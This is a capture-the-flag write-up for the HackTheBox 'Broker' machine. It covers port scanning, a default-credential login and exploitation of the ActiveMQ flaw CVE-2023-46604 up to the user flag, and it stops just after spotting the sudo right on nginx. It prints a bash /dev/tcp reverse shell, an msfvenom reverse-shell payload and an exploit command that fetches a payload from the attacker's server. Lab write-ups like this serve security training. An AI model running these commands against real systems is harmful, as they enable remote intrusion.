# Broker

# User Flag

## NMAP Enumeration

Masscan UDP/TCP Port Scan:

```bash
sudo masscan -p1-65535,U:1-65535 10.10.11.243 --rate=1000 -e tun0

Discovered open port 39091/tcp on 10.10.11.243                                 
Discovered open port 61616/tcp on 10.10.11.243                                 
Discovered open port 8161/tcp on 10.10.11.243                                  
Discovered open port 22/tcp on 10.10.11.243                                    
Discovered open port 61614/tcp on 10.10.11.243                                 
Discovered open port 61613/tcp on 10.10.11.243
```

All Open Ports Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN nmap-report-all-open-ports 10.10.11.243

PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1883/tcp  open  mqtt        syn-ack ttl 63
8161/tcp  open  patrol-snmp syn-ack ttl 63
61613/tcp open  unknown     syn-ack ttl 63
61614/tcp open  unknown     syn-ack ttl 63
61616/tcp open  unknown     syn-ack ttl 63
```

All Ports (Filtered, Closed, etc.)

```bash
sudo nmap -T5 -sS -vvv --min-rate=100 --max-retries=3 -p- -oN nmap-report-all-ports 10.10.11.243

22/tcp    open  ssh         syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1883/tcp  open  mqtt        syn-ack ttl 63
5672/tcp  open  amqp        syn-ack ttl 63
8161/tcp  open  patrol-snmp syn-ack ttl 63
39091/tcp open  unknown     syn-ack ttl 63
61613/tcp open  unknown     syn-ack ttl 63
61614/tcp open  unknown     syn-ack ttl 63
61616/tcp open  unknown     syn-ack ttl 63
```

Port Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report-service-scan 10.10.11.243 -p 22,80,1883,5672,8161,39091,61613,61614,61616

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
39091/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```

## Web Enumeration (Port 80) - Initial Foothold

Attempting to visit web page posted on port 80, I recieve a login popup and a 401 error due to not knowing the credentials.

![401 Error](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Broker/Images/Website%20401%20Error.png)

Searching online, I found an [article](https://oskari.org/documentation/backend/setup-jetty#:~:text=Setting%20up%20Jetty&text=You%20can%20login%20as%3A,admin%22%20and%20password%20%22oskari%22) that provides defualt login credentials for Jetty.

* User Credentials `user:user` - worked!
* Admin Credentials `admin:oskari` - failed.

Logging in shows we have access to Apache ActiveMQ:

![Apache ActiveMQ](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Broker/Images/Apache%20ActiveMQ.png)

A search online returns [CVE-2023-46604 RCE Pseudoshell](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell), which can be exploited using the exploit script on the github link as seen below:

```bash
sudo python3 exploit.py -i 10.10.11.243 -si <attacker_ip>

[Target not responding!]$ whoami
activemq

Apache ActiveMQ$ ls -lab
total 164
drwxr-xr-x  5 activemq activemq  4096 Nov  7  2023 .
drwxr-xr-x 11 activemq activemq  4096 Nov  6  2023 ..
-rwxr-xr-x  1 activemq activemq 21404 Apr 20  2021 activemq
-rwxr-xr-x  1 activemq activemq  6189 Apr 20  2021 activemq-diag
-rw-r--r--  1 activemq activemq 16389 Apr 20  2021 activemq.jar
-rw-r--r--  1 activemq activemq  5597 Apr 20  2021 env
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-32
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-64
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 macosx
-rw-r--r--  1 activemq activemq 83820 Apr 20  2021 wrapper.jar
```

## Privilege Escalation 

Checked the following information:

```bash
# Checked current user
Apache ActiveMQ$ whoami
activemq

# checked name of host
Apache ActiveMQ$ hostname
broker

# listed files in current directory
Apache ActiveMQ$ ls -la
total 164
drwxr-xr-x  5 activemq activemq  4096 Nov  7  2023 .
drwxr-xr-x 11 activemq activemq  4096 Nov  6  2023 ..
-rwxr-xr-x  1 activemq activemq 21404 Apr 20  2021 activemq
-rwxr-xr-x  1 activemq activemq  6189 Apr 20  2021 activemq-diag
-rw-r--r--  1 activemq activemq 16389 Apr 20  2021 activemq.jar
-rw-r--r--  1 activemq activemq  5597 Apr 20  2021 env
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-32
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-64
drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 macosx
-rw-r--r--  1 activemq activemq 83820 Apr 20  2021 wrapper.jar

# Checked what groups I am a member of.
Apache ActiveMQ$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)

# Checked Sudo Privileges
Apache ActiveMQ$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

I can see that I am able to run the command `nginx` with sudo privileges. 

Decided to get a netcat reverse shell for better stability:

```bash
# Attacker Machine
nc -lvnp 9001

# Target machine
bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001'
```

Could not get reverse shell to work above. Followed this [github](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ) instead:

```bash
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell
cd CVE-2023-46604-RCE-Reverse-Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
python3 -m http.server 8001
nc -lvnp 4444
```

Ran exploit script:

```bash
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.6:8001/poc-linux.xml
```

Stabilised reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Retrieved user flag:

```bash
activemq@broker:/home/activemq$ cat user.txt
cat user.txt
ccfaec2a1a9343d88.......
```

# Root Flag:


Earlier, I saw that I was able to run the command `nginx` with sudo privileges.

```bash
# Checked Sudo Privileges
Apache ActiveMQ$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```









